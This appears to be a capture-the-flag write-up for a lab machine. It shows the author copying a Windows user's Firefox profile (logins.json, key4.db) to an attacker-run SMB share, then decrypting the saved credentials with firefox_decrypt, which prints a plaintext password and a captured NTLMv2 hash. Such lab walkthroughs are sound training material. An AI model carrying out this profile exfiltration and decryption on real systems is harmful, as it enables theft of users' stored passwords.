
```sh
C:\Users\natbat\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\Desktop

05/14/2020  08:24 PM    <DIR>          .
05/14/2020  08:24 PM    <DIR>          ..
04/21/2020  04:00 PM             1,197 Firefox.lnk
04/20/2020  12:27 AM            13,312 gatekeeper.exe
04/21/2020  08:53 PM               135 gatekeeperstart.bat
05/14/2020  08:43 PM               140 user.txt.txt
               4 File(s)         14,784 bytes
               2 Dir(s)  15,886,823,424 bytes free
```

We get a hint about firefox. I couldn't find anything else to exploit on the box so let's look into it!

This also matches the box description and text:
"Can you get past the gate and through the fire?"
"Defeat the Gatekeeper to break the chains.  But beware, fire awaits on the other side."

https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/browser-artifacts.html?highlight=firefox#firefox

Firefox profiles path
`c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\`

```sh
c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles

04/21/2020  04:00 PM    <DIR>          .
04/21/2020  04:00 PM    <DIR>          ..
05/14/2020  09:45 PM    <DIR>          ljfn812a.default-release
04/21/2020  04:00 PM    <DIR>          rajfzh3y.default
               0 File(s)              0 bytes
               4 Dir(s)  15,751,983,104 bytes free

```

```
c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release

05/14/2020  09:45 PM    <DIR>          .
05/14/2020  09:45 PM    <DIR>          ..
05/14/2020  09:30 PM                24 addons.json
05/14/2020  09:23 PM             1,952 addonStartup.json.lz4
05/14/2020  09:45 PM                 0 AlternateServices.txt
05/14/2020  09:30 PM    <DIR>          bookmarkbackups
05/14/2020  09:24 PM               216 broadcast-listeners.json
04/21/2020  11:47 PM           229,376 cert9.db
04/21/2020  04:00 PM               220 compatibility.ini
04/21/2020  04:00 PM               939 containers.json
04/21/2020  04:00 PM           229,376 content-prefs.sqlite
05/14/2020  09:45 PM           524,288 cookies.sqlite
05/14/2020  09:24 PM    <DIR>          crashes
05/14/2020  09:45 PM    <DIR>          datareporting
04/21/2020  04:00 PM             1,111 extension-preferences.json
04/21/2020  04:00 PM    <DIR>          extensions
05/14/2020  09:34 PM            39,565 extensions.json
05/14/2020  09:45 PM         5,242,880 favicons.sqlite
05/14/2020  09:39 PM           196,608 formhistory.sqlite
04/21/2020  09:50 PM    <DIR>          gmp-gmpopenh264
04/21/2020  09:50 PM    <DIR>          gmp-widevinecdm
04/21/2020  04:00 PM               540 handlers.json
04/21/2020  04:02 PM           294,912 key4.db
05/14/2020  09:43 PM               600 logins.json
04/21/2020  04:00 PM    <DIR>          minidumps
05/14/2020  09:23 PM                 0 parent.lock
05/14/2020  09:25 PM            98,304 permissions.sqlite
04/21/2020  04:00 PM               506 pkcs11.txt
05/14/2020  09:45 PM         5,242,880 places.sqlite
05/14/2020  09:45 PM            11,096 prefs.js
05/14/2020  09:45 PM            65,536 protections.sqlite
05/14/2020  09:45 PM    <DIR>          saved-telemetry-pings
05/14/2020  09:23 PM             2,715 search.json.mozlz4
05/14/2020  09:45 PM                 0 SecurityPreloadState.txt
04/21/2020  09:50 PM    <DIR>          security_state
05/14/2020  09:45 PM               288 sessionCheckpoints.json
05/14/2020  09:45 PM    <DIR>          sessionstore-backups
05/14/2020  09:45 PM            12,889 sessionstore.jsonlz4
04/21/2020  04:00 PM                18 shield-preference-experiments.json
05/14/2020  09:45 PM             1,357 SiteSecurityServiceState.txt
04/21/2020  04:00 PM    <DIR>          storage
05/14/2020  09:45 PM             4,096 storage.sqlite
04/21/2020  04:00 PM                50 times.json
05/14/2020  09:45 PM                 0 TRRBlacklist.txt
04/21/2020  04:00 PM    <DIR>          weave
04/21/2020  04:02 PM            98,304 webappsstore.sqlite
05/14/2020  09:45 PM               140 xulstore.json
              33 File(s)     12,300,786 bytes
              14 Dir(s)  15,918,587,904 bytes free
```

We found the file profiles.ini:
```sh
c:\Users\natbat\AppData\Roaming\Mozilla\Firefox>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of c:\Users\natbat\AppData\Roaming\Mozilla\Firefox

04/21/2020  04:00 PM    <DIR>          .
04/21/2020  04:00 PM    <DIR>          ..
04/21/2020  04:00 PM    <DIR>          Crash Reports
04/21/2020  04:00 PM                75 installs.ini
01/20/2025  03:51 AM    <DIR>          Pending Pings
01/20/2025  04:22 AM    <DIR>          Profiles
04/21/2020  04:00 PM               305 profiles.ini
               2 File(s)            380 bytes
               5 Dir(s)  15,835,713,536 bytes free

c:\Users\natbat\AppData\Roaming\Mozilla\Firefox>type profiles.ini
type profiles.ini
[Profile1]
Name=default
IsRelative=1
Path=Profiles/rajfzh3y.default
Default=1

[Install4B4832DCE3D0EB51]
Default=Profiles/ljfn812a.default-release
Locked=1

[Profile0]
Name=default-release
IsRelative=1
Path=Profiles/ljfn812a.default-release

[General]
StartWithLastProfile=1
Version=2
```

Let's copy the files to out kali machine:

First we start a smb share:
```sh
┌──(kali㉿kali)-[~]
└─$ sudo impacket-smbserver -smb2support -username user -password password share share  
[sudo] password for kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.55.51,49242)
[*] AUTHENTICATE_MESSAGE (GATEKEEPER\user,GATEKEEPER)
[*] User GATEKEEPER\user authenticated successfully
[*] user::GATEKEEPER:aaaaaaaaaaaaaaaa:9a255bc8c3771b4aa0e82ed1a12db2d7:0101000000000000003c8217236bdb012a2eaa52db744f8d00000000010010006f0048006b0045007000440065005100030010006f0048006b0045007000440065005100020010006f0046004c004c007500440051006a00040010006f0046004c004c007500440051006a0007000800003c8217236bdb0106000400020000000800300030000000000000000000000000200000b9581e964eac723e54dbbc75499b25046c84e40511e61084c832ef9faeae0d240a001000000000000000000000000000000000000900220063006900660073002f00310030002e00320031002e00330031002e00310031003100000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Handle: The NETBIOS connection with the remote host timed out.
[*] Closing down connection (10.10.55.51,49242)
[*] Remaining connections []
[*] Incoming connection (10.10.55.51,49245)

...

```

Then we connect to the share:
```sh
C:\Users\natbat\Desktop>net use \\10.21.31.111\IPC$ /USER:user password
net use \\10.21.31.111\IPC$ /USER:user password
The command completed successfully.


C:\Users\natbat\Desktop>net view \\10.21.31.111
net view \\10.21.31.111
Shared resources at \\10.21.31.111

(null)

Share name  Type  Used as  Comment  

-------------------------------------------------------------------------------
SHARE     Disk                    
The command completed successfully.


C:\Users\natbat\Desktop>net use q: \\10.21.31.111\share   
net use q: \\10.21.31.111\share
The command completed successfully.
```

And copy the files:
```sh
c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>robocopy . Q:\gatekeeper /E
                                                                                  robocopy . Q:\gatekeeper /E
robocopy . Q:\gatekeeper /E

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows                              
-------------------------------------------------------------------------------

  Started : Mon Jan 20 06:07:01 2025

   Source : c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\
     Dest = Q:\gatekeeper\

    Files : *.*
            
  Options : *.* /S /E /COPY:DAT /R:1000000 /W:30 

------------------------------------------------------------------------------

          New Dir         34    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\
100%        New File                  24        addons.json
100%        New File                1952        addonStartup.json.lz4
100%        New File                   0        AlternateServices.txt
100%        New File                 216        broadcast-listeners.json
100%        New File              229376        cert9.db
100%        New File                 220        compatibility.ini
100%        New File                 939        containers.json
100%        New File              229376        content-prefs.sqlite
100%        New File              524288        cookies.sqlite
100%        New File                   0        dir
100%        New File                1111        extension-preferences.json
100%        New File               39565        extensions.json
100%        New File               5.0 m        favicons.sqlite
100%        New File              196608        formhistory.sqlite
100%        New File                 540        handlers.json
100%        New File              294912        key4.db
100%        New File                 600        logins.json
100%        New File                   0        parent.lock
100%        New File               98304        permissions.sqlite
100%        New File                 506        pkcs11.txt
100%        New File               5.0 m        places.sqlite
100%        New File               11096        prefs.js
100%        New File               65536        protections.sqlite
100%        New File                2715        search.json.mozlz4
100%        New File                   0        SecurityPreloadState.txt
100%        New File                 288        sessionCheckpoints.json
100%        New File               12889        sessionstore.jsonlz4
100%        New File                  18        shield-preference-experiments.json
100%        New File                1357        SiteSecurityServiceState.txt
100%        New File                4096        storage.sqlite
100%        New File                  50        times.json
100%        New File                   0        TRRBlacklist.txt
100%        New File               98304        webappsstore.sqlite
100%        New File                 140        xulstore.json
          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\bookmarkback          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\bookmarkback          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\bookmarkbackups\
100%        New File                 977        bookmarks-2020-05-14_11_fpRuQ0Xb8Mj0VzuQhTyhyQ==.jsonlz4
          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\crashes\
100%        New File                  66        store.json.mozlz4
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\crashes\even          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\crashes\even          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\crashes\events\
          New Dir          2    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\datareportin          New Dir          2    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\datareportin          New Dir          2    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\datareporting\
100%        New File                 161        session-state.json
100%        New File                  51        state.json
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\datareporting\archived\
          New Dir         12    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\datareporting\archived\2020-04\
100%        New File                3194        1587502935444.f24f57b4-8a35-4fa4-9384-0a60224eb682.new-profile.jsonlz4
100%        New File                3577        1587502935472.3c512846-96c6-4f0a-9348-a72148a8147c.event.jsonlz4
100%        New File               16759        1587502935484.1f605259-1edf-4906-83d5-eb5b6d7cda43.main.jsonlz4
100%        New File               16762        1587502935488.76a39628-24b5-4127-9c33-6c0da493292b.first-shutdown.jsonlz4
100%        New File                 432        1587505951900.b029bf6b-5818-4f52-b557-17a3b53e856e.health.jsonlz4
100%        New File                3330        1587505952021.dce2ce66-b8a6-4916-ab78-2587b5e0b84a.event.jsonlz4
100%        New File                 432        1587505952026.237d06b3-e910-46bc-a5d8-0805811a40a4.health.jsonlz4
100%        New File               13140        1587505952093.4b9b6c98-b7ba-46af-9068-b8b71479b353.main.jsonlz4
100%        New File                3436        1587524226007.8537639b-d7c1-4f46-ab94-9eb2f5c356c1.event.jsonlz4
100%        New File               13597        1587524226028.48f1a64f-9346-4638-95e6-6f51eeaa4e5e.main.jsonlz4
100%        New File               19073        1587530851660.d02f28bb-3c55-43ff-931c-11b3aead6396.main.jsonlz4
100%        New File               13101        1588019296910.1f8e84a3-64de-4a1d-ba6d-67feccc34353.main.jsonlz4
          New Dir          5    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\datareporting\archived\2020-05\
100%        New File               11579        1589505815268.8f6ffc81-a889-4088-855d-7b9e5aa873fa.main.jsonlz4
100%        New File                3117        1589509569196.107eec5d-0160-4344-a81f-d996d5d1f5ac.update.jsonlz4
100%        New File               10673        1589510406703.7d69fdbe-4eb5-4ea8-ae9b-c2345e4b39a3.modules.jsonlz4
100%        New File                3527        1589510702399.cea284dc-d2c8-49d0-83ac-156558a40c8e.event.jsonlz4
100%        New File               17028        1589510702419.d1902081-47c8-48c0-9b2a-4ce179f9cf7b.main.jsonlz4
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\extensions\
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\gmp-gmpopenh          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\gmp-gmpopenh          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\gmp-gmpopenh264\
          New Dir          2    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\gmp-gmpopenh264\1.8.1.1\
100%        New File               1.1 m        gmpopenh264.dll
100%        New File                 116        gmpopenh264.info
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\gmp-widevine          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\gmp-widevine          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\gmp-widevinecdm\
          New Dir          5    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\gmp-widevinecdm\4.10.1582.2\
100%        New File                 479        LICENSE.txt
100%        New File                 374        manifest.json
100%        New File               9.0 m        widevinecdm.dll
100%        New File                4988        widevinecdm.dll.lib
100%        New File                1427        widevinecdm.dll.sig
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\minidumps\
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\saved-teleme          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\saved-teleme          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\saved-telemetry-pings\
          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\security_sta          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\security_sta          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\security_state\
100%        New File               1.0 m        data.safe.bin
          New Dir          2    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\sessionstore          New Dir          2    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\sessionstore          New Dir          2    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\sessionstore-backups\
100%        New File                1380        previous.jsonlz4
100%        New File                5266        upgrade.jsonlz4-20200403170909
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\defa          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\defa          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\default\
          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\default\moz-extension+++bdf8c86b-73b8-4026-966c-7c4d67d7b253^userContextId=4294967295\
100%        New File                 193        .metadata-v2
          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\default\moz-extension+++bdf8c86b-73b8-4026-966c-7c4d67d7b253^userContextId=4294967295\idb\
100%        New File               49152        3647222921wleabcEoxlt-eengsairo.sqlite
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\default\moz-extension+++bdf8c86b-73b8-4026-966c-7c4d67d7b253^userContextId=4294967295\idb\3647222921wleabcEoxlt-eengsairo.files\
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\perm          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\perm          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\permanent\
          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\permanent\chrome\
100%        New File                  42        .metadata-v2
          New Dir          6    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\permanent\chrome\idb\
100%        New File               49152        1451318868ntouromlalnodry--epcr.sqlite
100%        New File               81920        1657114595AmcateirvtiSty.sqlite
100%        New File               49152        2823318777ntouromlalnodry--naod.sqlite
100%        New File               49152        2918063365piupsah.sqlite
100%        New File               49152        3561288849sdhlie.sqlite
100%        New File              15.1 m        3870112724rsegmnoittet-es.sqlite
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\permanent\chrome\idb\1451318868ntouromlalnodry--epcr.files\
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\permanent\chrome\idb\1657114595AmcateirvtiSty.files\
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\permanent\chrome\idb\2823318777ntouromlalnodry--naod.files\
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\permanent\chrome\idb\2918063365piupsah.files\
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\permanent\chrome\idb\3561288849sdhlie.files\
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\permanent\chrome\idb\3870112724rsegmnoittet-es.files\
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\temp          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\temp          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\storage\temporary\
          New Dir          0    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\weave\
          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\weave\failed          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\weave\failed          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\weave\failed\
100%        New File                  10        tabs.json
          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\weave\toFetc          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\weave\toFetc          New Dir          1    c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\weave\toFetch\
100%        New File                  10        tabs.json

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :        35        35         0         0         0         0
   Files :        76        76         0         0         0         0
   Bytes :   38.54 m   38.54 m         0         0         0         0
   Times :   0:01:25   0:01:06                       0:00:00   0:00:18


   Speed :              604916 Bytes/sec.
   Speed :              34.613 MegaBytes/min.

   Ended : Mon Jan 20 06:08:26 2025

c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>
```

On kali:
```sh
┌──(kali㉿kali)-[~/share/gatekeeper]
└─$ ls -la
total 12128
drwxr-xr-x 14 root root    4096 Jan 20 12:08 .
drwxrwxrwx  5 kali kali    4096 Jan 20 12:07 ..
-rwxr-xr-x  1 root root       0 May 15  2020 AlternateServices.txt
-rwxr-xr-x  1 root root       0 May 15  2020 SecurityPreloadState.txt
-rwxr-xr-x  1 root root    1357 May 15  2020 SiteSecurityServiceState.txt
-rwxr-xr-x  1 root root       0 May 15  2020 TRRBlacklist.txt
-rwxr-xr-x  1 root root    1952 May 15  2020 addonStartup.json.lz4
-rwxr-xr-x  1 root root      24 May 15  2020 addons.json
drwxr-xr-x  2 root root    4096 Jan 20 12:07 bookmarkbackups
-rwxr-xr-x  1 root root     216 May 15  2020 broadcast-listeners.json
-rwxr-xr-x  1 root root  229376 May 15  2020 cert9.db
-rwxr-xr-x  1 root root     220 May 15  2020 compatibility.ini
-rwxr-xr-x  1 root root     939 May 15  2020 containers.json
-rwxr-xr-x  1 root root  229376 May 15  2020 content-prefs.sqlite
-rwxr-xr-x  1 root root  524288 May 15  2020 cookies.sqlite
drwxr-xr-x  3 root root    4096 Jan 20 12:07 crashes
drwxr-xr-x  3 root root    4096 Jan 20 12:07 datareporting
-rwxr-xr-x  1 root root       0 Jan 20 10:22 dir
-rwxr-xr-x  1 root root    1111 May 15  2020 extension-preferences.json
drwxr-xr-x  2 root root    4096 Jan 20 12:07 extensions
-rwxr-xr-x  1 root root   39565 May 15  2020 extensions.json
-rwxr-xr-x  1 root root 5242880 May 15  2020 favicons.sqlite
-rwxr-xr-x  1 root root  196608 May 15  2020 formhistory.sqlite
drwxr-xr-x  3 root root    4096 Jan 20 12:07 gmp-gmpopenh264
drwxr-xr-x  3 root root    4096 Jan 20 12:07 gmp-widevinecdm
-rwxr-xr-x  1 root root     540 May 15  2020 handlers.json
-rwxr-xr-x  1 root root  294912 May 15  2020 key4.db
-rwxr-xr-x  1 root root     600 May 15  2020 logins.json
drwxr-xr-x  2 root root    4096 Jan 20 12:08 minidumps
-rwxr-xr-x  1 root root       0 May 15  2020 parent.lock
-rwxr-xr-x  1 root root   98304 May 15  2020 permissions.sqlite
-rwxr-xr-x  1 root root     506 May 15  2020 pkcs11.txt
-rwxr-xr-x  1 root root 5242880 May 15  2020 places.sqlite
-rwxr-xr-x  1 root root   11096 May 15  2020 prefs.js
-rwxr-xr-x  1 root root   65536 May 15  2020 protections.sqlite
drwxr-xr-x  2 root root    4096 Jan 20 12:08 saved-telemetry-pings
-rwxr-xr-x  1 root root    2715 May 15  2020 search.json.mozlz4
drwxr-xr-x  2 root root    4096 Jan 20 12:08 security_state
-rwxr-xr-x  1 root root     288 May 15  2020 sessionCheckpoints.json
drwxr-xr-x  2 root root    4096 Jan 20 12:08 sessionstore-backups
-rwxr-xr-x  1 root root   12889 May 15  2020 sessionstore.jsonlz4
-rwxr-xr-x  1 root root      18 May 15  2020 shield-preference-experiments.json
drwxr-xr-x  5 root root    4096 Jan 20 12:08 storage
-rwxr-xr-x  1 root root    4096 May 15  2020 storage.sqlite
-rwxr-xr-x  1 root root      50 May 15  2020 times.json
drwxr-xr-x  4 root root    4096 Jan 20 12:08 weave
-rwxr-xr-x  1 root root   98304 May 15  2020 webappsstore.sqlite
-rwxr-xr-x  1 root root     140 May 15  2020 xulstore.json
```

Oh, the file with the encrypted login info, the key is in key4.db:
```sh
┌──(kali㉿kali)-[~/share/gatekeeper2]
└─$ cat logins.json 
{"nextId":2,"logins":[{"id":1,"hostname":"https://creds.com","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECL2tyAh7wW+dBAh3qoYFOWUv1g==","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIcug4ROmqhOBBgUMhyan8Y8Nia4wYvo6LUSNqu1z+OT8HA=","guid":"{7ccdc063-ebe9-47ed-8989-0133460b4941}","encType":1,"timeCreated":1587502931710,"timeLastUsed":1587502931710,"timePasswordChanged":1589510625802,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}              
```

We will use this tool to decrypt the saved creds:
https://github.com/unode/firefox_decrypt

```
┌──(kali㉿kali)-[~/share/gatekeeper2]
└─$ python ~/tools/firefox_decrypt.py . 
2025-01-20 12:37:46,730 - WARNING - profile.ini not found in .
2025-01-20 12:37:46,730 - WARNING - Continuing and assuming '.' is a profile location

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'

┌──(kali㉿kali)-[~/share/gatekeeper2]
└─$
```

Let's assume we can use there on the box
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'

